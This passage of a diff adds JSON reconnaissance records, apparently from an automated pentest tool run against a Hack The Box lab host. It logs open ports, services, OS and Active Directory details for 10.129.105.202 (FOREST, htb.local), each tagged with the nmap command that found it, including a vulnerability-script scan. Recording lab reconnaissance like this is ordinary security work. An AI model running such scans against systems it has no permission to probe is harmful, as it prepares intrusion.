+          "evidence": "47001/tcp http"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:49664",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49664,
+          "protocol": "tcp",
+          "service": "msrpc",
+          "version": "Microsoft Windows RPC"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.msrpc",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49664,
+          "protocol": "tcp",
+          "service": "msrpc",
+          "version": "Microsoft Windows RPC"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:49665",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49665,
+          "protocol": "tcp",
+          "service": "msrpc",
+          "version": "Microsoft Windows RPC"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.msrpc",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49665,
+          "protocol": "tcp",
+          "service": "msrpc",
+          "version": "Microsoft Windows RPC"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:49666",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49666,
+          "protocol": "tcp",
+          "service": "msrpc",
+          "version": "Microsoft Windows RPC"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.msrpc",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49666,
+          "protocol": "tcp",
+          "service": "msrpc",
+          "version": "Microsoft Windows RPC"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:49668",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49668,
+          "protocol": "tcp",
+          "service": "msrpc",
+          "version": "Microsoft Windows RPC"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.msrpc",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49668,
+          "protocol": "tcp",
+          "service": "msrpc",
+          "version": "Microsoft Windows RPC"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:49670",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49670,
+          "protocol": "tcp",
+          "service": "msrpc",
+          "version": "Microsoft Windows RPC"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.msrpc",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49670,
+          "protocol": "tcp",
+          "service": "msrpc",
+          "version": "Microsoft Windows RPC"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:49676",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49676,
+          "protocol": "tcp",
+          "service": "ncacn_http",
+          "version": "Microsoft Windows RPC over HTTP 1.0"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.ncacn_http",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49676,
+          "protocol": "tcp",
+          "service": "ncacn_http",
+          "version": "Microsoft Windows RPC over HTTP 1.0"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:49677",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49677,
+          "protocol": "tcp",
+          "service": "msrpc",
+          "version": "Microsoft Windows RPC"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.msrpc",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49677,
+          "protocol": "tcp",
+          "service": "msrpc",
+          "version": "Microsoft Windows RPC"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:49683",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49683,
+          "protocol": "tcp",
+          "service": "msrpc",
+          "version": "Microsoft Windows RPC"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.msrpc",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49683,
+          "protocol": "tcp",
+          "service": "msrpc",
+          "version": "Microsoft Windows RPC"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:49698",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49698,
+          "protocol": "tcp",
+          "service": "msrpc",
+          "version": "Microsoft Windows RPC"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.msrpc",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49698,
+          "protocol": "tcp",
+          "service": "msrpc",
+          "version": "Microsoft Windows RPC"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:49952",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49952,
+          "protocol": "tcp",
+          "service": "msrpc",
+          "version": "Microsoft Windows RPC"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.msrpc",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49952,
+          "protocol": "tcp",
+          "service": "msrpc",
+          "version": "Microsoft Windows RPC"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:53",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 53,
+          "protocol": "tcp",
+          "service": "domain",
+          "version": "Simple DNS Plus"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.dns",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 53,
+          "protocol": "tcp",
+          "service": "domain",
+          "version": "Simple DNS Plus"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:593",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 593,
+          "protocol": "tcp",
+          "service": "ncacn_http",
+          "version": "Microsoft Windows RPC over HTTP 1.0"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.ncacn_http",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 593,
+          "protocol": "tcp",
+          "service": "ncacn_http",
+          "version": "Microsoft Windows RPC over HTTP 1.0"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:5985",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 5985,
+          "protocol": "tcp",
+          "service": "http",
+          "version": "Microsoft HTTPAPI httpd 2.0 SSDP/UPnP"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.http",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 5985,
+          "protocol": "tcp",
+          "service": "http",
+          "version": "Microsoft HTTPAPI httpd 2.0 SSDP/UPnP"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "winrm.reachable",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 5985,
+          "protocol": "tcp",
+          "service": "http"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "host.os_hint",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "family": "windows",
+          "confidence": "medium",
+          "tool": "nmap",
+          "evidence": "5985/tcp http"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:636",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 636,
+          "protocol": "tcp",
+          "service": "tcpwrapped"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.tcpwrapped",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 636,
+          "protocol": "tcp",
+          "service": "tcpwrapped"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "ldap.reachable",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 636,
+          "protocol": "tcp",
+          "service": "tcpwrapped"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:88",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 88,
+          "protocol": "tcp",
+          "service": "kerberos-sec",
+          "version": "Microsoft Windows Kerberos server time: 2026-10-11 17:54:36Z"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.kerberos-sec",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 88,
+          "protocol": "tcp",
+          "service": "kerberos-sec",
+          "version": "Microsoft Windows Kerberos server time: 2026-10-11 17:54:36Z"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:9389",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 9389,
+          "protocol": "tcp",
+          "service": "mc-nmf",
+          "version": ".NET Message Framing"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.mc-nmf",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 9389,
+          "protocol": "tcp",
+          "service": "mc-nmf",
+          "version": ".NET Message Framing"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "scan.nmap.version",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "profile": "service-version"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "host.os_hint",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "family": "windows",
+          "confidence": "high",
+          "tool": "nmap",
+          "evidence": "Microsoft Windows Kerberos server time: 2026-10-11 17:54:36Z",
+          "os": "Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.059
+      },
+      {
+        "kind": "host.os_family",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "family": "windows",
+          "confidence": "high",
+          "tool": "nmap",
+          "evidence": "Microsoft Windows Kerberos server time: 2026-10-11 17:54:36Z",
+          "os": "Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.059
+      },
+      {
+        "kind": "ad.domain_known",
+        "scope": "domain:htb.local",
+        "value": {
+          "name": "htb.local"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.059
+      },
+      {
+        "kind": "ad.base_dn",
+        "scope": "domain:htb.local",
+        "value": {
+          "base_dn": "DC=htb,DC=local"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.059
+      },
+      {
+        "kind": "host.domain",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "domain": "htb.local"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.059
+      },
+      {
+        "kind": "host.hostname",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "name": "FOREST"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.059
+      },
+      {
+        "kind": "host.fqdn",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "fqdn": "forest.htb.local",
+          "hostname": "forest",
+          "domain": "htb.local"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.059
+      },
+      {
+        "kind": "smb.signing",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "enabled": true,
+          "tool": "nmap",
+          "required": true
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.059
+      },
+      {
+        "kind": "ad.dc_candidate",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "ports": [
+            88,
+            389,
+            445
+          ],
+          "domain": "htb.local",
+          "name": "FOREST"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.059
+      },
+      {
+        "kind": "host.os_hint",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "family": "windows",
+          "confidence": "high",
+          "tool": "nmap",
+          "evidence": "88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-10-11 17:56:23Z)"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202",
+        "created_at": 1791741371.525
+      },
+      {
+        "kind": "host.os_family",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "family": "windows",
+          "confidence": "high",
+          "tool": "nmap",
+          "evidence": "88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-10-11 17:56:23Z)"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202",
+        "created_at": 1791741371.525
+      },
+      {
+        "kind": "host.up",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "target": "10.129.105.202",
+          "latency": "0.034s latency"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202",
+        "created_at": 1791741371.526
+      },
+      {
+        "kind": "scan.nmap.vuln",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "profile": "nse-vuln"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202",
+        "created_at": 1791741371.526
+      },
+      {
+        "kind": "port:3268",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 3268,
+          "protocol": "tcp",
+          "service": "ldap",
+          "version": "Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202",
+        "created_at": 1791741371.526
+      },
+      {
+        "kind": "service.ldap",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 3268,
+          "protocol": "tcp",
+          "service": "ldap",
+          "version": "Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202",
+        "created_at": 1791741371.526
+      },
+      {
+        "kind": "port:389",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 389,
+          "protocol": "tcp",
+          "service": "ldap",
+          "version": "Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202",
+        "created_at": 1791741371.526
+      },
+      {
+        "kind": "service.ldap",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 389,
+          "protocol": "tcp",
+          "service": "ldap",
+          "version": "Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202",
+        "created_at": 1791741371.526
+      },
+      {
+        "kind": "port:445",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 445,
+          "protocol": "tcp",
+          "service": "microsoft-ds",
+          "version": "Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202",
+        "created_at": 1791741371.526
+      },
+      {
+        "kind": "service.smb",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 445,
+          "protocol": "tcp",
+          "service": "microsoft-ds",
+          "version": "Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202",
+        "created_at": 1791741371.526
+      },
+      {
+        "kind": "port:464",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 464,
+          "protocol": "tcp",
+          "service": "kpasswd5?"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202",
+        "created_at": 1791741371.526
+      },
+      {
+        "kind": "service.kpasswd5",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 464,
+          "protocol": "tcp",
+          "service": "kpasswd5?"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202",
+        "created_at": 1791741371.526
+      },
+      {
+        "kind": "port:47001",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 47001,
+          "protocol": "tcp",
+          "service": "http",
+          "version": "Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202",
+        "created_at": 1791741371.526
+      },
+      {
+        "kind": "service.http",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 47001,
+          "protocol": "tcp",
+          "service": "http",
+          "version": "Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202",
+        "created_at": 1791741371.526
+      },
+      {
+        "kind": "port:5985",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 5985,
+          "protocol": "tcp",
+          "service": "http",
+          "version": "Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202",
+        "created_at": 1791741371.526
+      },
+      {
+        "kind": "service.http",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 5985,
+          "protocol": "tcp",
+          "service": "http",
+          "version": "Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)"
+        },
+        "state": "supported",
